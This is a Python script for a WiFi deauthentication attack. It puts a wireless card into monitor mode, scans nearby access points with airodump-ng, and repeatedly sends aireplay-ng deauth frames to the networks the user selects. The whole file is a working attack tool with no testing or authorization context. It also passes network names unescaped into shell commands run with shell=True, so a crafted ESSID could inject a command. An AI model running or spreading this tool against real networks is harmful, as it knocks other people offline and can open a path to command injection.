import sys
import os
import time
from subprocess import Popen, PIPE, STDOUT
import csv
import pandas

wlan_if_pre = "wlan1"
wlan_if_mon = wlan_if_pre

csv_filename = "airodump_data-01.csv"

bssids = []
essids = []
channels = []
proc_read = 0

list_stop_label = ' Power'
invite = " > "
spin_i = 0

DN = open(os.devnull, 'w')

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

class symbols:
    PREVSTRING = "\033[F"

def start():
    global proc_read

    proc_read = exec_thread_wait("rm airodump_data*")
    proc_read = exec_thread_wait("killall airodump-ng")
    proc_read = exec_thread_wait("killall aireplay-ng")

    select_iface()
    menu()

def menu():
    global proc_read

    while True:
        try:
            print(bcolors.OKGREEN + "WiFi Deauth: scan, run, exit" + bcolors.ENDC)

            global invite
            cmd = input(invite)
            cmd = cmd.lower()

            if "scan" in cmd:
                scan(wlan_if_mon)

            elif "run" in cmd:
                print(bcolors.OKGREEN + "WiFi Deauth: Enter index(es): " + bcolors.ENDC)
                args = input(invite)
                indexes = args.split()

                print("Deauth targets:")
                for index in indexes:
                    i = int(index)
                    print(essids[i] + " (" + bssids[i] + "), channel " + channels[i])

                deauth_number = 1
                stop = False;
                while not stop:
                    for index in indexes:
                        i = int(index)
                        stop = deauth(bssids[i], essids[i], channels[i], wlan_if_mon, deauth_number)
                        if stop:
                            break;
                        draw_spin()

            elif "exit" in cmd:
                exit()

            else:
                print(bcolors.FAIL + "WiFi Deauth: Wrong Command => " + cmd + bcolors.ENDC)

        except(KeyboardInterrupt):
            print(bcolors.WARNING + "\nWiFi Deauth: (Ctrl + C ) Exit" + bcolors.ENDC)
            proc_read.kill()
            break;

def select_iface():
    global proc_read
    global invite

    print(bcolors.OKGREEN + "WiFi Deauth: Select interface to be switched in Monitor mode" + bcolors.ENDC)
    interface_list = get_ifaces()
    for i in range(len(interface_list)):
        print(str(i).rjust(2) + "\t" + interface_list[i].ljust(32))
    idx = input(invite)
    wlan_if_pre = interface_list[int(idx)]

    proc_read = exec_thread_wait("airmon-ng start " + wlan_if_pre)

    print(bcolors.OKGREEN + "WiFi Deauth: Select interface in Monitor mode to be used for deauth" + bcolors.ENDC)
    interface_list = get_ifaces()
    for i in range(len(interface_list)):
        print(str(i).rjust(2) + "\t" + interface_list[i].ljust(32))
    idx = input(invite)
    wlan_if_mon = interface_list[int(idx)]

def scan(iface):
    global proc_read

    proc_read = exec_thread("airodump-ng -w airodump_data --output-format csv --band abg " + iface)

    while os.path.exists(csv_filename) == False:
        continue

    while True:
        try:
            os.system("clear")
            csv_reader(csv_filename)
            draw_spin()
            time.sleep(0.5)

        except(KeyboardInterrupt):
            print(bcolors.WARNING + "\nWiFi Deauth: (Ctrl + C ) Scan finished" + bcolors.ENDC)
            break;

    proc_read.kill()
    proc_read = exec_thread_wait("rm " + csv_filename)

def csv_reader(csv_path):
    colnames = ['BSSID', 'First time seen', 'Last time seen', 'channel', 'Speed', 'Privacy', 'Cipher', 'Authentication', 'Power', '# beacons', '# IV', 'LAN IP', 'ID-length', 'ESSID', 'Key']
    data = pandas.read_csv(csv_filename, names=colnames)
    if len(data.index) == 0:
        return

    data = data.drop(0)
    split_idx = data.index[data['channel'] == list_stop_label].tolist()
    split_idx = split_idx[0]

    data_ap      = data.iloc[:split_idx-1, :]
    data_ap = data_ap.sort_values(by=["Power"])

    data_station = data.iloc[split_idx:, :6]
    data_station.set_axis(["Station MAC", "First time seen", "Last time seen", "Power", "# packets", "BSSID"], axis = 1, inplace = True)

    global essids
    global bssids
    global channels
    essids = data_ap.ESSID.tolist()
    bssids = data_ap.BSSID.tolist()
    channels = data_ap.channel.tolist()

    rssis = data_ap.Power.tolist()

    dict = {}
    for i in range(len(data_ap.index)):
        dict[bssids[i]] = 0

    bssids_packets = data_station.BSSID.tolist()
    n_packets = data_station["# packets"].tolist()

    for i in range(len(n_packets)):
        bssid_packet = bssids_packets[i].strip()
        n_packet = int(n_packets[i])
        if bssid_packet in dict.keys():
            dict[bssid_packet] = dict[bssid_packet] + n_packet

    num = len(essids)

    print("№".rjust(2) + " ESSID".ljust(33) + "BSSID".ljust(20) + "RSSI".rjust(5) + "CH".rjust(5) + "Packets".rjust(8) + "\n")
    for i in range(num):
        print(str(i).rjust(2) + str(essids[i]).ljust(33) + str(bssids[i]).ljust(20) + str(rssis[i]).rjust(5) + str(channels[i]).rjust(5) + str(dict[bssids[i]]).rjust(8))

def deauth(bssid, essid, channel, iface, deauth_number):
    global proc_read
    try:
        proc_read = exec_thread_wait("iwconfig " + iface + " channel " + channel)
        proc_read = exec_thread_wait("aireplay-ng --deauth " + str(deauth_number) + " -o 1 -a " + bssid + " -e \'" + essid + "\' " + iface)
        return False

    except(KeyboardInterrupt):
        print(bcolors.WARNING + "\nWiFi Deauth: (Ctrl + C ) Attack stopped" + bcolors.ENDC)
        return True

def exec_thread(os_cmd):
    proc_read = Popen(os_cmd, shell=True, stdout=DN, stderr=DN)
    return proc_read

def exec_thread_wait(os_cmd):
    proc_read = Popen(os_cmd, shell=True, stdout=DN, stderr=DN).wait()
    return proc_read

def draw_spin():
    global spin_i
    spin = ["-", "\\", "|", "/"]
    print(spin[spin_i] + symbols.PREVSTRING)
    spin_i = spin_i + 1
    if spin_i >= len(spin):
        spin_i = 0

def get_ifaces():
    banned_interfaces = ["eth", "eth0", "eth1", "eth2", "lo", "lo0", "lo1", "lo2"]
    interface_list = []
    for i in os.listdir("/sys/class/net/"):
        if i not in banned_interfaces:
            interface_list.append(i)
    return interface_list

if __name__=='__main__':
    start()
